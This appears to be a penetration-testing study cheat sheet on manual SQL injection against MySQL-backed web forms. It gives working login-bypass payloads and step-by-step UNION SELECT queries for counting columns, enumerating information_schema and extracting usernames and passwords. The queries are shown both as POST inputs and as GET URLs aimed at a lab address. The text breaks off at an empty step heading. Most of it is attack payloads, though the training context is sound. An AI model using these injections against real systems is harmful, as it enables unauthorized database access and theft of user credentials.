# Commands
We are only using the `select` and `union` methods

# Default Databases
```
information_schema
mysql
performance_schema
```
# Structure
```
Information Schema
--> Tables
  --> Columns
    --> TABLE_SCHEMA
      --> TABLE_NAME
      --> Column_NAME
```
# Enumerating
```
show tables ;
show columns from columns ;
```

```
select table_schema,table_name,column_name from information_schema.columns ;
```

```
select name,cost,color from session.car
```

```
@@VERSION
```
This will print the version number

# Bypass Login
```
' or 1=1 --
```
\+
```
SELECT * FROM users WHERE username = '' AND password = 'foo'
```
Changes to
```
SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'foo'
```

Querying all usernames and passwords
```
10.50.36.14/login.php?username=tom' OR 1='1 & passwd=tom' OR 1='1
```
# Hijacking Search SQL (POST METHOD)

## 1. Identify vulnerable field

Test with:
```
Name' or 1='1
```

## 2. Attempt to view more
```
Audi ' UNION SELECT 1,2,3,4 #
```
If this doesn't work try adding more columns, I.E: `1,2,3,4,5 #` (IT MIGHT BE AS HIGH AS 15)

NOTE: this is the number of columns you must use for every query

## 3. Edit Golden Statement
Golden Statement:
```
UNION SELECT table_schema,table_name,column_name from information_schema.columns #
```
Lets say there are only 5 columns with column 2 unavailable available:

Put unavailable and known columns in the right place (put `2` in the second position and put `5` in the fifth position)
```
UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
```
Add to our previous UNION statement from step 2
```
Audi ' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
```
## 4. Find Tables of Interest
For example
| Manufacturer | Cost | Color | Year
| - | - | - | - |
| --- | --- | --- | --- |
|session |userinfo 	 |studentID 	|5|
|session |	userinfo |	 username| 	  5|
|session 	|userinfo 	|  passwd 	|    5|
|session 	|userinfo 	|  jump 	  |    5|
|session 	|userinfo 	|  prid 	 |     5|

or

```
Database  Table      Columns
------------------------------
session
          userinfo
                     studentID
                     username
                     passwd
                     jump
                     prid
```

Shows a database `session` with a table `userinfo` and columns with `studentID`, `username`, `passwd`, `jump`, `prid`

## 5. Create New Queries
Requirements:
- Must match the number of columns of the golden rule (in our example 5 columns)
- Any unavailable columns must be used (in our example column 2)

```
UNION SELECT type,2,cost,color,year from session.car #
```

```
UNION SELECT studentID,2,username,passwd,jump from session.userinfo #
```
# Hijacking Search SQL (GET METHOD)
## 1. Identify Vulnerable Field
When using the sql get method, you may notice the sql query in the url:
```
http://10.50.36.14/uniondemo.php?Selection=4&Submit=Submit
```
The `?Selection=4` is the query

Test this by replacing the standard query with

```
Selection=4 or 1=1
```
This would look like:
```
http://10.50.36.14/uniondemo.php?Selection=4 or 1=1&Submit=Submit
```
## 2. Attempt to view more
Get the column count with:
```
Selection=2 UNION SELECT 1,2,3
```
This would look like:
```
http://10.50.36.14/uniondemo.php?Selection=2 UNION SELECT 1,2,3&Submit=Submit
```

If more columns are needed (it errors out) add them as so: `1,2,3,4,5`
## 3. Edit Golden Statement
Golden Statement:
```
UNION SELECT table_schema,table_name,column_name from information_schema.columns
```
For our example we have only 3 columns available, because of this no modifications are neccessary

Add to our previous UNION statement from step 2
```
Selection=2 UNION SELECT table_schema,table_name,column_name from information_schema.columns
```

This would look like:
```
http://10.50.36.14/uniondemo.php?Selection=2 UNION SELECT table_schema,table_name,column_name from information_schema.columns&Submit=Submit
```
## 4. Find Tables of Interest
From our example:
| Manufacturer | Cost | Tire Size |
| - | - | - |
| --- | --- | --- |
|session 	|studentID 	|userinfo|
|session 	|username |	userinfo|
|session 	|passwd |	userinfo|
|session 	|jump |	userinfo|
|session 	|prid 	|userinfo|

or

```
Database   Table      Column
--------------------------------
session
           userinfo   
                      studentID
                      username
                      passwd
                      jump
                      prid
```

Shows a database `session` with a table `userinfo` and columns with `studentID`, `username`, `passwd`, `jump`, `prid`

## 5
